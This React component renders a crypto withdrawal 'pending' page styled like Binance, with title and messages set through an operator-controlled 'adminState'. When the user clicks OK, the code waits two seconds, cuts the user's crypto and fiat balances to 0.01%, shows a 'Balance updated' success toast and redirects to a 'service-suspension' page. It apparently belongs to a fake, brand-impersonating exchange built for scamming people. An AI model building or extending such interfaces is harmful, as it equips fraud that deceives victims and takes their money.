import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useApp } from '@/store/AppContext';
import { LoadingBars } from '@/components/ui/custom/LoadingBars';
import { Clock } from 'lucide-react';

export default function Pending() {
  const navigate = useNavigate();
  const { adminState, withdrawalTransaction, updateBalance, showToast } = useApp();
  const [isLoading, setIsLoading] = useState(false);

  const { pendingPage, balance } = adminState;

  async function handleOK() {
    setIsLoading(true);
    
    // Simulate processing
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Reset crypto balance to 0.01% of current
    const currentCryptoBalance = parseFloat(balance.cryptoAmount);
    const newCryptoBalance = (currentCryptoBalance * 0.0001).toFixed(4);
    
    // Reset fiat balance to 0.01% of current
    const currentFiatBalance = parseFloat(balance.fiatAmount.replace(/,/g, ''));
    const newFiatBalance = (currentFiatBalance * 0.0001).toFixed(2);
    
    updateBalance({
      cryptoAmount: newCryptoBalance,
      fiatAmount: newFiatBalance,
    });
    
    setIsLoading(false);
    showToast('Balance updated', 'success');
    navigate('/service-suspension');
  }

  const amount = withdrawalTransaction?.amount || '0';
  const cryptoSymbol = withdrawalTransaction?.cryptoSymbol || balance.cryptoSymbol;

  return (
    <div className="min-h-screen flex flex-col items-center bg-[#1D252B] text-white px-5 pt-24 pb-8">
      
      {/* Success Icon */}
      <div className="w-[70px] h-[70px] relative mb-7">
        <div className="absolute w-full h-full border-2 border-dotted border-[#f0b90b] rounded-full animate-rotate" />
        <div className="absolute top-[7px] left-[7px] right-[7px] bottom-[7px] bg-[#f0b90b] rounded-full flex items-center justify-center">
          <Clock className="w-7 h-7 text-[#1D252B]" />
        </div>
      </div>

      {/* Title */}
      <div className="text-[22px] font-semibold text-[#F0B90B] mb-6 text-center">
        {pendingPage.title}
      </div>

      {/* Message Lines */}
      <div className="text-center mb-[60px]">
        <div className="text-sm font-normal text-white leading-relaxed">
          {pendingPage.messageLine1}
        </div>
        <div className="text-sm font-normal text-white leading-relaxed">
          {pendingPage.messageLine2}
        </div>
      </div>

      {/* Amount Card */}
      <div 
        className="rounded-2xl py-8 px-[60px] text-center mt-5 mb-auto min-w-[280px]"
        style={{ background: 'rgba(0, 0, 0, 0.3)' }}
      >
        <div className="text-sm text-[#5a6268] mb-3 capitalize">You'll receive</div>
        <div className="text-[28px] font-semibold text-white mb-1.5 tracking-tight">
          {parseFloat(amount).toFixed(2)} {cryptoSymbol}
        </div>
        <div className="text-sm text-[#5a6268]">
          ≈ {balance.fiatSymbol}{(parseFloat(amount) * 50000).toFixed(2)}
        </div>
      </div>

      {/* Transaction ID */}
      <div className="text-xs text-[#848e9c] mb-6">
        TX ID: {withdrawalTransaction?.id || 'N/A'}
      </div>

      {/* OK Button */}
      <button
        onClick={handleOK}
        disabled={isLoading}
        className="binance-btn h-12 md:h-11 lg:h-11 text-[15px] md:text-base max-w-[280px] md:max-w-[320px] lg:max-w-[280px]"
      >
        {isLoading ? (
          <LoadingBars color="#1E2329" size="sm" />
        ) : (
          pendingPage.okButtonText
        )}
      </button>
    </div>
  );
}
